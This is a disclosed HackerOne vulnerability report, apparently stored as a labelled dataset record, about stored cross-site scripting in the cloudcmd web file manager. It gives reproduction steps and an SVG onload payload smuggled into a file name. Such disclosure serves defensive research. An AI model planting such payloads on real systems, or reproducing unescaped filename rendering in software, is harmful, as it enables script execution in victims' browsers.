{
  "reported_to": "Node.js third-party modules",
  "reported_by": "tungpun ",
  "title": "[cloudcmd] Stored XSS in the filename when directories listing",
  "content": "\nI would like to report a Stored XSS issue in module cloudcmd\nIt allows executing malicious javascript code in the user's browser.\nModule\nmodule name: cloudcmd\nversion: 9.1.5\nnpm page: https://www.npmjs.com/package/cloudcmd\nModule Description\nCloud Commander is an orthodox web file manager with console and editor.\nModule Stats\n4,433 downloads in the last week\n<image_0>\nVulnerability\nSteps To Reproduce:\nInstall the module\nCode 16 Bytes\n1$ npm i cloudcmd\nRun\nCode 50 Bytes\n1$ ./node_modules/cloudcmd/bin/cloudcmd.js --root .\nIn the target directory, create a file with name \"><svg onload=alert(3);>\nCode 38 Bytes\n1bash$ touch '\"><svg onload=alert(3);>'\nIn the browser, go to http://127.0.0.1:8080/, the XSS popup will fire.\n<image_1>\nSupporting Material/References:\nmacOS High Sierra 10.13.4\nnode v8.10.0\nnpm 5.6.0\nChrome Version 65.0.3325.181 (Official Build) (64-bit)\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nIt allows executing malicious javascript code in the user's browser\n\n",
  "severity": [
    8.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/288/918/1b9a8983a54e936cca04c47210e8991f377ce3a5/cloudcmd3.png?response-content-disposition=attachment%3B%20filename%3D%22cloudcmd3.png%22%3B%20filename%2A%3DUTF-8%27%27cloudcmd3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSSP3QJG2%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T172403Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC3KYa8%2Bjx2WYWS6PUb%2Br9nud2898Z1NBWvHtqsijwb5QIgbw%2FfERMuBo5k43cHzydjgHWn8kWRfrCw1kkfUAldw38qsQUIMhADGgwwMTM2MTkyNzQ4NDkiDFq3Zp19llp9Pe7h3yqOBVI8srwPEsePGqvQQSvtWFGomAhew1kmXl64o4B0%2FdCJVZPp5BLBysYZJVUbSB0kXT2FxEXMimtFXezxylPEdKDRCbcF90vYNaEjLEEFFj6f5Xl%2BgooEJaBofIBHWBfxhQZWmd%2F0C5HF%2BgDQpAA8aRbZBJnBt%2BTxm8Y%2F3RC5MWrx0E3%2FfeXGgQrxRmBUpPiMgtEvMeZ%2BC4LJvyP6XXW6wJOPLuG6Qc2CoJ2JCkFV1PR2r2xPmkC4l9rOpCdGGs4goJlj0gTyU0z%2FOe%2B2VCymyuoJVsgMdWZ8vFCqgxDR7ICmfa8oMcNnTLcmXrhUqOZgtqUHROOJ%2FaupQsOy228pTZ7dNH7HbWcgd3PvnxeTC07UM9v14%2FIoY9NJVPt7JclBsdrK7XJGxYG6khdKbLJHML94UNV3x6iANK93UkD%2FJRWgaghK%2Bfx%2FEM%2Fep0YY9byi98oebN8T5fJSQJh5yjx3HxW03F0wDRfXqHx6szUjqHoRWoAHOMQI%2BKL2toiGXLoYdCPAv7sIEucY6QU6n%2Fq%2FD%2Bq5%2B9AMVZ2zhASsL7FWuKv4VfMpqvsoOP72gBpuUpQmL%2B1ufaHLMc3IwT9j3yGRXj6alhxnYqo4CzannVC3qrhqVOKT%2FkZ97L%2FVnxURY9jgcsT0jOkYsznUG7OwaCtlsOxno8S8ZXcxz%2Blo9AlIvTciNGQtWN7NiQKO0v1MogkxEHUH33IpDiYgZ9bEMQEl%2BegldhcMHRWdwkaL8%2F%2FCdi94vByuQZS0yM4Uh9Uc3FOVUaJ7yy2QOMkRH8ZFNEZU7Dxm6lS%2FnIpBMheItdtNygMLzMWQepfjMt4YJ0DAMi4%2F6K0xY10RjHfTvip2sBSqP%2Fdh2s09q9ydz6%2BZ5aKiKTCm3JC%2FBjqxAWh2R3WTw90sQcz5k33F4ENG72PDMCNB9uGhMQHBL%2FW41qfmDLbeRe0kIu6%2BUlF1zsdWyXxoorodUcBH8jrkBwohGhVcJdHUBggX1TiG6VeyZOXcc4bAPKpxZhZohu4vsjVsh7rX0cfqHLGf3TqYc6fjaqCFgxnKgo9xYMuoLEIXleV24azkQHidXx005b8yqLO6DluU5SeiynXb%2FK0dQTRFuMzTLPXwz7M5350NDsoXLA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ddc19678baa71b9ea4ec045b266cc7a2571c684c1b1b07183490e16e983d0b84",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/288/917/835081f021dd29d58d5956ef614af9f3303541fa/cloudcmd2.png?response-content-disposition=attachment%3B%20filename%3D%22cloudcmd2.png%22%3B%20filename%2A%3DUTF-8%27%27cloudcmd2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSSP3QJG2%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T172403Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC3KYa8%2Bjx2WYWS6PUb%2Br9nud2898Z1NBWvHtqsijwb5QIgbw%2FfERMuBo5k43cHzydjgHWn8kWRfrCw1kkfUAldw38qsQUIMhADGgwwMTM2MTkyNzQ4NDkiDFq3Zp19llp9Pe7h3yqOBVI8srwPEsePGqvQQSvtWFGomAhew1kmXl64o4B0%2FdCJVZPp5BLBysYZJVUbSB0kXT2FxEXMimtFXezxylPEdKDRCbcF90vYNaEjLEEFFj6f5Xl%2BgooEJaBofIBHWBfxhQZWmd%2F0C5HF%2BgDQpAA8aRbZBJnBt%2BTxm8Y%2F3RC5MWrx0E3%2FfeXGgQrxRmBUpPiMgtEvMeZ%2BC4LJvyP6XXW6wJOPLuG6Qc2CoJ2JCkFV1PR2r2xPmkC4l9rOpCdGGs4goJlj0gTyU0z%2FOe%2B2VCymyuoJVsgMdWZ8vFCqgxDR7ICmfa8oMcNnTLcmXrhUqOZgtqUHROOJ%2FaupQsOy228pTZ7dNH7HbWcgd3PvnxeTC07UM9v14%2FIoY9NJVPt7JclBsdrK7XJGxYG6khdKbLJHML94UNV3x6iANK93UkD%2FJRWgaghK%2Bfx%2FEM%2Fep0YY9byi98oebN8T5fJSQJh5yjx3HxW03F0wDRfXqHx6szUjqHoRWoAHOMQI%2BKL2toiGXLoYdCPAv7sIEucY6QU6n%2Fq%2FD%2Bq5%2B9AMVZ2zhASsL7FWuKv4VfMpqvsoOP72gBpuUpQmL%2B1ufaHLMc3IwT9j3yGRXj6alhxnYqo4CzannVC3qrhqVOKT%2FkZ97L%2FVnxURY9jgcsT0jOkYsznUG7OwaCtlsOxno8S8ZXcxz%2Blo9AlIvTciNGQtWN7NiQKO0v1MogkxEHUH33IpDiYgZ9bEMQEl%2BegldhcMHRWdwkaL8%2F%2FCdi94vByuQZS0yM4Uh9Uc3FOVUaJ7yy2QOMkRH8ZFNEZU7Dxm6lS%2FnIpBMheItdtNygMLzMWQepfjMt4YJ0DAMi4%2F6K0xY10RjHfTvip2sBSqP%2Fdh2s09q9ydz6%2BZ5aKiKTCm3JC%2FBjqxAWh2R3WTw90sQcz5k33F4ENG72PDMCNB9uGhMQHBL%2FW41qfmDLbeRe0kIu6%2BUlF1zsdWyXxoorodUcBH8jrkBwohGhVcJdHUBggX1TiG6VeyZOXcc4bAPKpxZhZohu4vsjVsh7rX0cfqHLGf3TqYc6fjaqCFgxnKgo9xYMuoLEIXleV24azkQHidXx005b8yqLO6DluU5SeiynXb%2FK0dQTRFuMzTLPXwz7M5350NDsoXLA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84f5658e7d8c0e98046c61c9ea367be47d582b2c12e8c73e2f82a2ecc404f198"
  },
  "disclosed_date": 1524692760,
  "report_url": "https://hackerone.com/reports/341044",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Install the module: `npm i cloudcmd`"
    ],
    [
      2,
      "Run the module: `./node_modules/cloudcmd/bin/cloudcmd.js --root .`"
    ],
    [
      3,
      "Create a file with a malicious name: `touch '\"><svg onload=alert(3);>'`"
    ],
    [
      4,
      "Access the web interface at http://127.0.0.1:8080/ to trigger the XSS"
    ]
  ],
  "vuln_description": "A Stored XSS vulnerability exists in the cloudcmd module, where a malicious filename containing JavaScript code can be executed in the user's browser when the directory listing is viewed.",
  "reason": "The vulnerability involves a straightforward exploitation of filename handling in a web file manager, without requiring complex interactions or novel logic. The steps to reproduce are simple and do not involve multiple components or subtle interactions.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The vulnerability involves injecting an XSS payload into a filename parameter which gets reflected in directory listings. The methodology would detect this since: 1) Filename is an injectable parameter captured during regular navigation (file creation), 2) The simple unencoded SVG payload matches basic XSS test patterns, 3) Execution occurs through normal directory viewing (same-channel trigger), 4) No filter bypasses were needed as HTML special characters were rendered raw in the response.",
    "is_simple_injection": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a Stored XSS in the filename when directories are listed, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on AuthN/AuthZ bypass and IDOR vulnerabilities, which are different from XSS vulnerabilities. Therefore, the methodology described would not detect this XSS issue.",
    "is_detectable": false
  }
}